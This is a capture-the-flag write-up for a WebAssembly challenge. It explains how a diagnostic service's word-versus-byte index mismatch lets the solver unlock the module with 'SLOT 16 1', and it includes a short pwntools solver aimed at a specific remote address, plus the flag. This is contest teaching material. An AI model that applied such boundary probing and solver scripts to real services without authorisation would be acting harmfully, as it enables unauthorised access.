# cartridge

> Category: Pwn
> CTF: TRYHARDS
> Year: 2026

## Description
>We are given a tiny WebAssembly module, `module.wasm`, and a remote diagnostic service that exposes it over a command prompt. The module exports `set_cell(offset, value)`, `get_cell(offset)`, and `is_unlocked()`. `is_unlocked()` simply returns the `i32` stored at linear-memory byte offset `64`, so the module-level goal is to make `memory[64] != 0`. The intended-looking move, `SLOT 64 1`, does not work: the front panel indexes cells as 32-bit words while the module expects a byte offset. The valid slot range ends at `16383`, which is exactly `65536 / 4 - 1`, so byte `64` lives at slot `16`. Sending `SLOT 16 1` flips the cell that `is_unlocked()` reads and `REPORT` prints the flag.

---

## Initial Analysis

### Source Code / Binary

The supplied archive contains a single file:

```text
cartridge.zip
└── module.wasm        # 164-byte WebAssembly module
```

The `module.wat` and `module.dcmp` files included next to this writeup are just readable forms of the same module. `wasm-objdump -x` gives the whole picture:

```text
Type[3]:
 - type[0] (i32, i32) -> nil
 - type[1] (i32) -> i32
 - type[2] () -> i32
Function[3]:
 - func[0] sig=0 <set_cell>
 - func[1] sig=1 <get_cell>
 - func[2] sig=2 <is_unlocked>
Memory[1]:
 - memory[0] pages: initial=1
Export[4]:
 - memory[0] -> "memory"
 - func[0] <set_cell> -> "set_cell"
 - func[1] <get_cell> -> "get_cell"
 - func[2] <is_unlocked> -> "is_unlocked"
Code[3]:
 - func[0] size=9 <set_cell>
 - func[1] size=7 <get_cell>
 - func[2] size=8 <is_unlocked>
Data[1]:
 - segment[0] memory=0 size=4 - init i32=64
  - 0000040: 0000 0000                                ....
```

The relevant logic is four instructions long:

```wat
(func $set_cell (param $offset i32) (param $value i32)
  local.get $offset
  local.get $value
  i32.store)

(func $get_cell (param $offset i32) (result i32)
  local.get $offset
  i32.load)

(func $is_unlocked (result i32)
  i32.const 64
  i32.load)
```

At the module level:

- `set_cell(64, 1)` writes a `1` to byte offset `64`.
- `get_cell(64)` reads it back.
- `is_unlocked()` reads the same `i32` at byte `64`.

The data segment initializes that cell to zero, so the module starts locked. If we could call the exports directly, the solve would be `set_cell(64, 1); is_unlocked();`. The remote wrapper is where the subtlety lives.

### Protections

This is a WebAssembly challenge rather than a native binary, so the usual
stack canary, NX, and PIE triage does not apply. The module runs inside the
wasm sandbox and does not expose a memory-corruption primitive. The bug is in
the contract between the host and the module, not in the sandboxed code.

### Service

Connecting to the service shows the command set:

```text
$ nc 109.123.232.54 9113
CARTRIDGE diagnostic port -- front panel v2
commands: SLOT <idx> <value>, PEEK <idx>, STATUS, REPORT, QUIT
>
```

The commands map to the module exports:

| command | effect |
|---|---|
| `SLOT <idx> <value>` | write `value` to a cell |
| `PEEK <idx>` | read a cell |
| `STATUS` | call `is_unlocked()` and print `locked` / `unlocked` |
| `REPORT` | print the flag if the diagnostic mode is unlocked |

The first attempt is usually the direct one:

```text
> SLOT 64 1
slot 64 written
> PEEK 64
slot 64 = 1
> STATUS
diagnostic mode: locked
```

The write clearly succeeded, but the mode is still locked. This is the point where the byte-vs-word contract matters.

### Vulnerability

The front panel does not pass our index straight to the module. It treats the index as a 32-bit word/slot and multiplies it by four:

```text
SLOT <i> <v>  ->  set_cell(i * 4, v)
PEEK <i>      ->  get_cell(i * 4)
```

The bound check confirms the scaling. The module has one 64 KiB memory page, which is `65536 / 4 = 16384` words. Probing the end of the range:

```text
> PEEK 16383
slot 16383 = 0
> PEEK 16384
fault: out of bounds access, closing connection
```

Index `16383` is valid, `16384` is not, so the host validates `idx * 4 + 4 <= 65536`. Our `SLOT 64 1` therefore wrote to byte `256`, not byte `64`. Meanwhile `PEEK 64` also read byte `256`, which is why it echoed `1` and made the write look correct.

Byte offset `64` is word slot:

```text
64 / 4 = 16
```

#### Trigger

Only the first write matters:

```text
> SLOT 16 1
slot 16 written
> STATUS
diagnostic mode: unlocked
> REPORT
TryHards{diagnostic_port_left_wide_open_4a9c21}
```

`SLOT 16 1` becomes `set_cell(16 * 4, 1)` = `set_cell(64, 1)`, so `is_unlocked()` now returns a non-zero value and the host takes the unlocked branch.

## Solution

The whole exploit is two commands after connecting:

```text
SLOT 16 1
REPORT
```

`STATUS` is only useful to confirm the transition from `locked` to `unlocked`. There is no memory corruption, no control-flow hijack, and no wasm exploit primitive involved: the module's sandbox is intact. The bug is the mismatch between the front panel's word index and the module's byte offset, which lets the player write the unlock cell with the wrong-looking-but-correct slot number.

## Exploit

The solver is in [`solve.py`](solve.py). It connects to the service, sends the write, and prints the status and report:

```python
p = remote("109.123.232.54", 9113)
p.recvuntil(b"\n> ", timeout=5)

def cmd(line):
    p.sendline(line.encode())
    return p.recvuntil(b"\n> ", timeout=5)

# is_unlocked() reads byte 64; the front panel uses 32-bit word indices,
# so word 16 maps to byte 64.
cmd("SLOT 16 1")

status = cmd("STATUS").decode().splitlines()[0].strip()
flag = cmd("REPORT").decode().splitlines()[0].strip()
```

Running it:

```text
$ python3 solve.py
diagnostic mode: unlocked
TryHards{diagnostic_port_left_wide_open_4a9c21}
```

## Flag

```text
TryHards{diagnostic_port_left_wide_open_4a9c21}
```

## Takeaways

- In wasm challenges, the vulnerability is often in the contract between the host and the module, not inside the sandboxed code. Check units, index scaling, and signedness before assuming the module is wrong.
- Boundary probing is a fast way to recover index scaling. A valid range of `0..16383` for a 64 KiB memory means the interface is indexing 32-bit words, not bytes.
- A `PEEK` that agrees with a `SLOT` does not prove that the write reached the cell the module actually checks; both commands may be applying the same transformation.
- The module-level solve was `set_cell(64, 1)`. The remote solve was `SLOT 16 1`. The difference of a factor of four was the entire challenge.
